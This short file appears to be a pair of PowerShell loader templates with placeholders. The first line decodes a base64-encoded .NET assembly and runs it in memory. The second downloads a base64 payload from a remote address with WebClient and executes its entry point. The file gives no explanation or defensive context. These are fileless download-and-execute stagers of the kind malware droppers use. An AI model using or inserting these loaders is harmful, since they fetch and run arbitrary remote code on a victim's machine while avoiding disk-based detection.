[AppDomain]::CurrentDomain.Load([Convert]::Frombase64String('%')).'EntryPoint'.'Invoke'($null,$null)

////////////////////////////////////////////////////////////////////////////////////////////////////////////

[AppDomain]::CurrentDomain.Load([Convert]::Frombase64String((New-Object System.Net.WebClient).Downloadstring('%'))).EntryPoint.invoke($null,$null)
